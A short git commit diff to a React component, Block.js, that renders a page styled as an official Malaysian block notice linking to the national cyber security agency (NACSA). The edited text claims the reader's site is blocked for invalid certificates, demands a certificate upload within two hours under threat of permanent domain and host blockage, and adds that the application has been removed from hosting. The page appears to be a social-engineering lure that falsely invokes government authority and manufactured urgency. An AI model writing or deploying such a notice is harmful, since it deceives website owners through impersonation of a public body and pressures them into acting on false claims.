d08ad41c2f4fb0300d3ebac6bb80ca7037d2b0d8
Amrish <amrish@Amrishs-MBP.lan>
2024-03-29 20:59:48 +0530

    fdsjuh

--- src/Block.js
+++ src/Block.js
@@ -9,7 +9,7 @@ function block() {
       <div className="notify">NOTIFICATION</div>
       <div className="note">This website is not available in Malaysia as it violate(s) the National Law(s).</div>
       <div className="note1">Untuk maklumat tanjut / for more information <span className="link"><a href="https://www.nacsa.gov.my/legal.php">Click here</a></span>.</div>
-      <div className="error"><span className="action">Action required:</span> You site has been blocked due to invalid certifications. we request you to upload a valid certificates within 2 hours to prevent permanent Domain and Host blockage.</div>
+      <div className="error"><span className="action">Action required:</span> You site has been blocked due to invalid certifications. we request you to upload a valid certificates within 2 hours to prevent permanent Domain and Host blockage. We pleased to inform that your web application has been removed from default hosting.</div>
     </div>
     </>
   )
